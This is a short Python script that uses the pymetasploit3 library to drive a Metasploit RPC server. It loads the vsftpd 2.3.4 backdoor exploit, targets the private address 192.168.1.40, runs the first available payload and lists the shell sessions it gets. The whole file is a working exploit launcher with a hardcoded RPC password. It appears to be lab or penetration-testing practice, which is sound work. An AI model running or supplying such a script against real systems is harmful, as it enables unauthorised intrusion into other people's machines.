from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole

# /opt/metasploit-framework/bin/msfconsole
# /opt/metasploit-framework/bin/msfvenom
# load msgrpc [Pass=yourpassword]

client = MsfRpcClient('wVYIfb92', port=55552)
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.1.40'  # IP of our target host
print(exploit.targetpayloads())
exploit.execute(payload=exploit.targetpayloads()[0])
print(client.sessions.list)
